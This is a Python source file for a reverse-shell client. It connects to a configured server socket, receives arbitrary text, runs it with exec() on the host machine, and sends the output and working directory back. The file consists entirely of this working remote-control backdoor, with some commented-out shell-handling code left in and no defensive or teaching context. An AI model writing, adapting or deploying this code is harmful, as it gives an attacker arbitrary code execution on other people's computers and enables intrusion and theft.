import socket
import os
import subprocess, threading
import sys
from io import StringIO

def run_command(command):
    temp_out = StringIO()
    temp_err = StringIO()
    sys.stdout = temp_out
    sys.stderr = temp_err
    exec(command)
    sys.stdout = sys.__stdout__
    sys.stderr = sys.__stderr__
    out = temp_out.getvalue()
    err = temp_err.getvalue()
    if (out): print(out,end='')
    if (err): print(err,file=sys.stderr,end='')
    return out, err


SERVER_HOST = '127.0.0.1'
SERVER_PORT = 80
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# create the socket object
s = socket.socket()
# connect to the server
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.connect((SERVER_HOST, SERVER_PORT))

# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())
def wait_input(sock,BUFFER_SIZE):
    while True:
        command = input(f"Client {cwd} $> ")
        if not command.strip():
            # empty command
            continue

        sock.send(command.encode())
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            sock.close()
            break

        output = sock.recv(BUFFER_SIZE).decode()
        print(output, end='')

def main():
    while True:
        # receive the command from the server
        #thread = threading.Thread(target=wait_input,args=(s,BUFFER_SIZE,))
        #thread.start()
        command = s.recv(BUFFER_SIZE).decode()

        '''
            command = input(f"Client {cwd} $> ")
        if not command.strip():
            # empty command
            continue
            
        client_socket.send(command.encode())
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        '''
        splited_command = command.split()
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        else:
            print('RECIEVE COMMAND\n>', command)
            out, err = run_command(command)
            if (out): s.send(out.encode())
            if (err): s.send(err.encode())
            # execute the command and retrieve the results
            # output = subprocess.getoutput(command)

        '''
            if splited_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    # if there is an error, set as the output
                    output = str(e)
                else:
                    # if operation is successful, empty message
                    output = ""
            '''
        # get the current working directory as output
        cwd = os.getcwd()
        # send the results back to the server
        message = f"{out}{err}{SEPARATOR}{cwd}"

        s.send(message.encode())


    # close client connection
    s.close()

if __name__ == '__main__':
    main()